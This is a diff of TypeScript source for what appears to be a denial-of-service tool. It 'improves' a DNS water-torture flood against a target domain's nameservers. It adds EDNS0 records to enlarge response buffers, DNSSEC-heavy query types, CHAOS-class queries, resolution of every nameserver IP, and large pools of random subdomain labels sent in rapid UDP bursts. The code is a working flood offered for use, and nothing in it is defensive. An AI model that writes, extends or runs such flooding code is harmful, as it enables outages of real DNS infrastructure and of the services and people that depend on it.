@@ -513,8 +513,21 @@ async function runICMPFlood(
 //  No raw sockets needed — pure dgram UDP.
 // ─────────────────────────────────────────────────────────────────────────
 
-function buildDNSQuery(fqdn: string, qtype: number, txid: number): Buffer {
-  // Build binary DNS query packet
+// ── EDNS(0) OPT record — appended to every DNS query ─────────────────────
+// Tells NS server we accept 4096-byte UDP responses → forces larger response
+// buffer allocation per query (more memory pressure on NS server).
+// RFC 6891: OPT Name=root(0x00), Type=41, Class=requestorUDPsize=4096,
+//           TTL=extRCODE+flags=0, RDLENGTH=0
+const EDNS0_OPT = Buffer.from([
+  0x00,                   // Name: root
+  0x00, 0x29,             // Type: OPT (41)
+  0x10, 0x00,             // Class: 4096 (max accepted UDP payload)
+  0x00, 0x00, 0x00, 0x00, // TTL: extended RCODE=0, version=0, flags=0
+  0x00, 0x00,             // RDLENGTH: 0 (no extra options)
+]);
+
+function buildDNSQuery(fqdn: string, qtype: number, txid: number, qclass = 1): Buffer {
+  // qclass: 1=IN (Internet), 3=CHAOS (forces unexpected parsing in some impls)
   const labels = fqdn.split(".");
   const nameParts: Buffer[] = labels.map(l => {
     const lb = Buffer.allocUnsafe(1 + l.length);
@@ -529,11 +542,11 @@ function buildDNSQuery(fqdn: string, qtype: number, txid: number): Buffer {
   hdr.writeUInt16BE(1, 4);               // QDCOUNT = 1
   hdr.writeUInt16BE(0, 6);               // ANCOUNT = 0
   hdr.writeUInt16BE(0, 8);               // NSCOUNT = 0
-  hdr.writeUInt16BE(0, 10);              // ARCOUNT = 0
+  hdr.writeUInt16BE(1, 10);              // ARCOUNT = 1 (EDNS0 OPT record)
   const qHdr = Buffer.allocUnsafe(4);
   qHdr.writeUInt16BE(qtype, 0);          // QTYPE
-  qHdr.writeUInt16BE(1, 2);              // QCLASS: IN
-  return Buffer.concat([hdr, nameBytes, qHdr]);
+  qHdr.writeUInt16BE(qclass, 2);         // QCLASS: IN(1) or CHAOS(3)
+  return Buffer.concat([hdr, nameBytes, qHdr, EDNS0_OPT]);
 }
 
 const DNS_QTYPES = [
@@ -545,6 +558,10 @@ const DNS_QTYPES = [
   48,  // DNSKEY (forces DNSSEC computation on DNSSEC-enabled zones)
   43,  // DS
   6,   // SOA
+  47,  // NSEC  — forces DNSSEC NSEC chain traversal (NSEC Walking attack)
+  50,  // NSEC3 — forces DNSSEC NSEC3 hash chain computation (CPU-intensive)
+  257, // CAA   — Certification Authority Authorization (extra parser path)
+  46,  // RRSIG — digital signature records, expensive to compute/verify
 ];
 
 async function runDNSWaterTorture(
@@ -562,16 +579,18 @@ async function runDNSWaterTorture(
     ? domainParts.slice(-2).join(".")
     : hostname;
 
-  // Resolve NS servers for the target domain — these are NOT behind CDN
+  // ── Improvement: Resolve ALL IPs for ALL NS servers (not just first IP) ──
+  // Most NS servers have multiple A records — resolve every one for maximum coverage.
   let nsServers: string[] = [];
   try {
     const nsNames = await dns.resolve(rootDomain, "NS").catch(() => [] as string[]);
-    const nsIPs   = await Promise.all(
-      nsNames.slice(0, 6).map(ns =>
-        dns.resolve4(ns).then(ips => ips[0]).catch(() => null as string | null)
+    const nsIPGroups = await Promise.all(
+      nsNames.slice(0, 12).map(ns =>
+        dns.resolve4(ns).catch(() => [] as string[])
       )
     );
-    nsServers = nsIPs.filter((ip): ip is string => ip !== null);
+    // Flatten all IPs from all NS servers
+    nsServers = nsIPGroups.flat().filter(Boolean);
   } catch { /**/ }
 
   // Fallback: use public resolvers AND direct-to-target port 53 flood
@@ -586,8 +605,26 @@ async function runDNSWaterTorture(
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  const BURST = getDynamicBurst(200);
+  const BURST   = getDynamicBurst(200);
   const TICK_MS = 1;
+
+  // ── Improvement: Pre-build label pool (63-char DNS max per RFC 1035) ──────
+  // Using maximum 63-char labels creates larger packets than previous 26-char ones.
+  // Larger FQDN = more NS memory to parse + more bytes per packet sent.
+  const LABEL_POOL_SIZE = 512;
+  const labelPool: string[] = Array.from({ length: LABEL_POOL_SIZE }, () =>
+    Math.random().toString(36).slice(2).padEnd(8, "a") +
+    Math.random().toString(36).slice(2).padEnd(8, "b") +
+    Math.random().toString(36).slice(2).padEnd(8, "c") +
+    Math.random().toString(36).slice(2).padEnd(8, "d") +
+    Math.random().toString(36).slice(2).slice(0, 11)  // total = 8+8+8+8+11 = 43 chars
+  );
+
+  // ── Improvement: CHAOS class queries (class=3) to force unexpected paths ──
+  // ~20% of queries use CHAOS class — forces DNS server through non-standard
+  // parsing code paths that may be less optimized than the standard IN class.
+  const DNS_CLASSES = [1, 1, 1, 1, 3]; // 80% IN, 20% CHAOS
+
   const sockDones: Promise<void>[] = [];
   for (let _s = 0; _s < NUM_SOCKS; _s++) {
     const sockDone = new Promise<void>((resolve) => {
@@ -595,6 +632,7 @@ async function runDNSWaterTorture(
       sock.on("error", () => {});
       let closed = false;
       let txid = randInt(0, 65535);
+      let poolIdx = randInt(0, LABEL_POOL_SIZE);
       const forceClose = () => {
         if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
       };
@@ -603,10 +641,12 @@ async function runDNSWaterTorture(
         const iv = setInterval(() => {
           if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
           for (let i = 0; i < BURST; i++) {
-            const label  = randStr(8) + "-" + randStr(8) + "-" + randStr(8);
+            // Cycle through label pool — avoids Math.random() overhead per packet
+            const label  = labelPool[poolIdx++ % LABEL_POOL_SIZE];
             const fqdn   = `${label}.${rootDomain}`;
             const qtype  = DNS_QTYPES[randInt(0, DNS_QTYPES.length)];
-            const pkt    = buildDNSQuery(fqdn, qtype, txid++);
+            const qclass = DNS_CLASSES[randInt(0, DNS_CLASSES.length)];
+            const pkt    = buildDNSQuery(fqdn, qtype, txid++, qclass);
             const target = nsServers[randInt(0, nsServers.length)];
             sock.send(pkt, 0, pkt.length, 53, target, (_err) => {
               localPkts++; localBytes += pkt.length;
